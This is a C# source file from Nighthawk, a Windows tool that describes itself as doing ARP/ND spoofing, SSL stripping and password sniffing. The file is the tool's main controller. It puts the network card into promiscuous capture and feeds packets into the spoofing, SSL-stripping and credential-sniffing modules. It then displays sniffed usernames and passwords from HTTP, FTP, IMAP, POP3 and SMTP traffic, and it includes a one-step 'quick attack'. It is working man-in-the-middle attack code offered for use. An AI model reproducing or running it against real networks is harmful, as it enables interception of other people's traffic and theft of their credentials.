using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Shell;
using PacketDotNet;
using SharpPcap;
using SharpPcap.WinPcap;

/**
Nighthawk - ARP/ND spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2011, 2012  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    public class Main
    {
        public WinPcapDevice Device;

        public List<DeviceInfo> DeviceInfoList = new List<DeviceInfo>();
        public DeviceInfo DeviceInfo;

        public MainWindow Window;

        public Sniffer Sniffer;
        public ARPTools ARPTools;
        public NDTools NDTools;
        public SSLStrip SSLStrip;
        public Scanner Scanner;

        // simple MAC - VENDOR table (OUI)
        public Dictionary<string, string> Vendors = new Dictionary<string, string>();

        public bool Started;

        // last SSLStrip debug line
        private string lastSSLText = string.Empty;

        public Main(MainWindow window)
        {
            Window = window;
        }

        // get a collection of network interfaces
        public List<string> GetInterfaces()
        {
            var devices = new List<string>();

            DeviceInfoList.Clear();

            // try to check for WinPcap
            var error = false;

            try
            {
                var instance = WinPcapDeviceList.Instance[0];
                if (instance == null) error = true;
            } catch {
                error = true;
            }

            if(error) {
                MessageBox.Show("WinPcap not installed or no devices detected!", "Error",
                            MessageBoxButton.OK, MessageBoxImage.Error);

                return new List<string>();
            }
            //

            foreach (var device in WinPcapDeviceList.Instance)
            {
                // get IPv4 address, subnet mask and broadcast address
                var address = "";
                var subnet = "";
                var broadcast = "";

                var address6 = "";
                var address6List = new List<string>();
                var linkLocal = "";

                foreach (var addr in device.Addresses)
                {
                    if (addr.Addr.ipAddress != null)
                    {
                        // IPv4
                        if (addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                        {
                            address = addr.Addr.ipAddress.ToString();
                            subnet = addr.Netmask.ipAddress.ToString();
                            broadcast = addr.Broadaddr.ipAddress.ToString();
                        }
                        
                        // get IPv6 addresses
                        if (addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            if (!addr.Addr.ipAddress.IsIPv6LinkLocal)
                            {
                                address6 = addr.Addr.ipAddress.ToString();
                                address6List.Add(address6);
                            }
                            else
                            {
                                linkLocal = addr.Addr.ipAddress.ToString();
                            }
                        }
                    }
                }

                // strip description
                var descriptionParts = device.Description.Split('\'');
                var description = descriptionParts[1];

                if (address != string.Empty && address != "0.0.0.0")
                {
                    var gateway = device.Interface.GatewayAddress != null ? device.Interface.GatewayAddress.ToString() : "";

                    DeviceInfoList.Add(new DeviceInfo { Device = device, CIDR = (int)Network.MaskToCIDR(subnet), GatewayIP = gateway, IP = address, IPv6 = address6, IPv6List = address6List, LinkLocal = linkLocal, Mask = subnet, Broadcast = broadcast });
                    devices.Add(description + " (IPv4: " + address + "/" + Network.MaskToCIDR(subnet) + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
                }
                else
                {
                    DeviceInfoList.Add(new DeviceInfo { Device = device, IP = "0.0.0.0"});
                    devices.Add(description + " (IPv4: none" + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
                }

                // parse interface ID from WinPcap device "Name"
                var id = Regex.Split(device.Name, "NPF_")[1];

                // get and set mac address, gateway and windows name (DeviceInfo)
                foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (iface.Id == id)
                    {
                        if(DeviceInfoList.Last() != null)
                        {
                            DeviceInfoList.Last().PMAC = iface.GetPhysicalAddress();
                            DeviceInfoList.Last().WinName = iface.Name;

                            if (iface.GetIPProperties().GatewayAddresses.Count > 0)
                                DeviceInfoList.Last().GatewayIP = iface.GetIPProperties().GatewayAddresses.Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork).First().Address.ToString();
                        }
                    }
                }
            }

            return devices;
        }

        // start listening on a device (combobox index)
        public void StartDevice(int deviceIndex)
        {
            Started = true;

            DeviceInfo = DeviceInfoList[deviceIndex];
            Device = WinPcapDeviceList.Instance[deviceIndex];    

            Sniffer = new Sniffer(DeviceInfo);
            ARPTools = new ARPTools(DeviceInfo);
            NDTools = new NDTools(DeviceInfo);
            SSLStrip = new SSLStrip();
            Scanner = new Scanner(DeviceInfo);

            Sniffer.SnifferResult += new SnifferResultHandler(sniffer_OnSnifferResult);
            Scanner.ScannerResponse += new ScannerResponseReceived(scanner_OnResponse);
            Scanner.ScanComplete += new ScannerEventHandler(scanner_OnScanComplete);
            Scanner.HostnameResolved += new ScannerHostnameResolvedHandler(scanner_HostnameResolved);
            SSLStrip.SSLStripped += new SSLStripHandler(SSLStrip_OnSSLStripped);

            // open device, set filters & events, start capturing
            Device.Open(DeviceMode.Promiscuous, 1);
            Device.Filter = "(arp || ip || ip6)";

            Device.OnPacketArrival += new PacketArrivalEventHandler(device_OnPacketArrival);
            Device.StartCapture();
        }

        // stop listening on a device
        public void StopDevice()
        {
            Started = false;

            if (Device == null) return;

            Device.StopCaptureTimeout = TimeSpan.FromMilliseconds(200);
            Device.StopCapture();
            Device.Close();
        }

        // load OUI database from "OUI.txt" and fill the MAC - VENDOR table
        public void LoadOUI()
        {
            string[] dbLines = File.ReadAllLines("OUI.txt");

            foreach (var line in dbLines)
            {
                if (!line.StartsWith("#") && line.Length > 5)
                {
                    var macSegment = line.Substring(0, 8).Replace("-", "");
                    var vendor = line.Substring(9, line.Length - 9);

                    if(!Vendors.ContainsKey(macSegment)) Vendors.Add(macSegment, vendor);
                }
            }
        }

        // get vendor string from MAC address
        private string GetVendorFromMAC(string mac)
        {
            var macSegment = mac.Substring(0, 6);

            if (Vendors.ContainsKey(macSegment)) return Vendors[macSegment];
            
            return "";
        }

        // packet arrival event
        private void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            Packet packet;

            try
            {
                packet = Packet.ParsePacket(LinkLayers.Ethernet, e.Packet.Data);
            }
            catch
            {
                return;
            }

            if (packet is EthernetPacket)
            {

                var tcp = TcpPacket.GetEncapsulated(packet);
                var arp = ARPPacket.GetEncapsulated(packet);
                var ip = IpPacket.GetEncapsulated(packet);
                var icmpv6 = ICMPv6Packet.GetEncapsulated(packet);

                // ARP packet
                if (arp != null)
                {
                    if (Scanner.Started)
                    {
                        lock (Scanner.PacketQueueARP)
                        {
                            Scanner.PacketQueueARP.Add(arp);
                        }
                    }
                }

                // ICMPv6 packet
                if (icmpv6 != null)
                {
                    if (Scanner.Started)
                    {
                        lock (Scanner.PacketQueueNDP)
                        {
                            icmpv6.ParentPacket = ip;
                            icmpv6.ParentPacket.ParentPacket = packet;
                            Scanner.PacketQueueNDP.Add(icmpv6);
                        }
                    }
                }

                // TCP packet
                if (tcp != null)
                {
                    // HTTP, FTP, IMAP, POP3, SMTP packets (client -> server)
                    if (tcp.DestinationPort == 80 || tcp.DestinationPort == 21 || tcp.DestinationPort == 143 || tcp.DestinationPort == 110 || tcp.DestinationPort == 25)
                    {
                        if (Sniffer.Started)
                        {
                            lock (Sniffer.PacketQueue)
                            {
                                Sniffer.PacketQueue.Add(tcp);
                            }
                        }
                    }

                    // SSL stripping needs HTTP in & out
                    if (tcp.DestinationPort == 80 || tcp.SourcePort == 80)
                    {
                        if (SSLStrip.Started)
                        {
                            if(!SSLStrip.ProcessPacket(packet, tcp)) return;
                        }
                    }
                }

                // IP packet
                if (ip != null)
                {
                    // route IPv4
                    if (ARPTools.SpoofingStarted && ip.SourceAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lock (ARPTools.PacketQueueRouting)
                        {
                            ARPTools.PacketQueueRouting.Add(packet);
                        }
                    }

                    // route IPv6
                    if (NDTools.SpoofingStarted && ip.SourceAddress.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        lock (NDTools.PacketQueueRouting)
                        {
                            NDTools.PacketQueueRouting.Add(packet);
                        }
                    }
                }
            }
        }

        /* Module events */
        
        // sniffer result - username & password sniffed
        private void sniffer_OnSnifferResult(string url, string username, string password, string aditional, SnifferResultType type)
        {
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                var brush = new SolidColorBrush();

                // set brush color
                if (type == SnifferResultType.HTML)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferHTML);
                }
                else if (type == SnifferResultType.HTTPAuth)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferHTTPAuth);
                }
                else if (type == SnifferResultType.FTP)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferFTP);
                }
                else if (type == SnifferResultType.IMAP)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferIMAP);
                }
                else if (type == SnifferResultType.POP3)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferPOP3);
                }
                else if (type == SnifferResultType.SMTP)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferSMTP);
                }

                // create a new result item
                var result = new SnifferResult { URL = url, Username = username, Password = password, Aditional = aditional, Type = type, ShapeBrush = brush};

                // don't repeat entries
                if (Window.SnifferResultList.Count == 0 || (Window.SnifferResultList.Last().CompareString() != result.CompareString()))
                {
                    Window.SnifferResultList.Add(result);

                    // notify user (blinking green line on the "Sniffer" tab, Win7 taskbar));
                    if (Window.TCTabs.SelectedIndex != 1)
                    {
                        Window.RCTSnifferUpdated.Visibility = Visibility.Visible;
                        ((Storyboard)Window.Resources["STSnifferUpdated"]).Begin();

                        Window.TaskbarItemInfo.ProgressState = TaskbarItemProgressState.Indeterminate;
                    }
                }                
            }));
        }

        // scanner response - new target
        private void scanner_OnResponse(string ip, bool ipv6, PhysicalAddress mac, string hostname, List<string> ipv6List = null)
        {
            Window.Dispatcher.Invoke(new UI(delegate
            {
                // check for existing MAC and update current item
                var items = Window.TargetList.Where(o => o.MAC.Replace(":", "") == mac.ToString());

                if (items.Count() > 0)
                {
                    var item = items.First();

                    if (ipv6)
                    {
                        item.IPv6 = ip;

                        // change ipv6List
                        if (ipv6List != null && ipv6List.Count > 0) item.IPv6List = ipv6List;
                            
                        // add ip to the list after ping response (ipv6List is null)
                        if (ipv6List == null && !item.IPv6List.Contains(ip)) item.IPv6List.Add(ip);
                    }
                    else
                    {
                        item.IP = ip;
                    }
                }
                // add new item
                else
                {
                    var item = new Target { Hostname = hostname, MAC = Network.FriendlyPhysicalAddress(mac), PMAC = mac, Vendor = GetVendorFromMAC(mac.ToString()) };

                    if (ipv6)
                    {
                        item.IPv6 = ip;

                        // change ipv6List
                        if (ipv6List != null && ipv6List.Count > 0) item.IPv6List = ipv6List;

                        // add ip to the list after ping response (ipv6List is null)
                        if (ipv6List == null && !item.IPv6List.Contains(ip)) item.IPv6List.Add(ip);
                    }
                    else
                    {
                        item.IP = ip;
                    }

                    // exclude local MAC
                    if (mac.ToString() != DeviceInfo.PMAC.ToString())
                    {
                        Window.TargetList.Add(item);
                        Window.TargetList.Sort();
                    }
                }
            }));
        }

        // network scan completed
        private void scanner_OnScanComplete()
        {
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                Window.BScanNetwork.IsEnabled = true;
                Window.BScanNetwork.Content = "Scan network";

                // enable ARP spoofing buttons
                if (Window.TargetList.Count > 0)
                {
                    Window.BStartARP.IsEnabled = true;
                    Window.CHBlockPPTP.IsEnabled = true;
                    Window.CHResolveHostnames.IsEnabled = true;
                }

                // get MAC address of the gateway
                var gateway = Window.TargetList.Where(t => t.IP == DeviceInfo.GatewayIP);

                if (gateway.Count() > 0) DeviceInfo.GatewayPMAC = gateway.Last().PMAC;

                // check for IPv6 support
                if (DeviceInfo.IPv6 != string.Empty)
                {
                    DeviceInfo.GatewayIPv6 = NDTools.GetIPv6Gateway();

                    Window.BStartND.IsEnabled = true;
                    Window.TBPrefix.Text = Network.GetPrefixFromIP(DeviceInfo.IPv6);
                }

                // quick scan
                if(Window.QuickAttack) Window.StartQuickAttack();
            }));
        }
        
        // hostname resolved
        private void scanner_HostnameResolved(string ip, bool ipv6, string hostname)
        {
            if (Scanner.ResolveHostnames)
            {
                Window.Dispatcher.BeginInvoke(new UI(delegate
                {
                    // check for local IP
                    if (ip != DeviceInfo.IP)
                    {
                        var target = Window.TargetList.Where(t => t.IP == ip.ToString());
                        if(target.Count() > 0) target.First().Hostname = hostname;
                    }
                }));
            }
        }

        // SSL stripped
        private void SSLStrip_OnSSLStripped(string sourceIP, string destIP, List<string> changed)
        {
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                // construct "changes"
                var changedText = string.Empty;

                foreach(var change in changed)
                {
                    if(change != changed.Last())
                    {
                        changedText += change + ", ";
                    } else {
                        changedText += change;
                    }
                }

                var text = string.Empty;

                // build whole output string
                if (sourceIP != string.Empty)
                {
                    text = "Stripped: »" + changedText + "« (" + sourceIP + " -> " + destIP + ")";
                } else
                {
                    text = "Information: »" + changedText + "«";
                }

                var resultText = new Run(text);
                resultText.Foreground = new SolidColorBrush(Window.ColorSSLStrip);

                var thickness = new Thickness(0, 0, 0, 5);
                var paragraph = new Paragraph(resultText);

                paragraph.Margin = thickness;

                // don't repeat the same entries
                if (lastSSLText != text)
                {
                    lastSSLText = text;

                    if(Window.TSSLText.Document.Blocks.Count > 0) {
                        Window.TSSLText.Document.Blocks.InsertBefore(Window.TSSLText.Document.Blocks.First(), paragraph);
                    } else {
                        Window.TSSLText.Document.Blocks.Add(paragraph);
                    }
                }
            }));
        }
    }

    public delegate void UI();
}
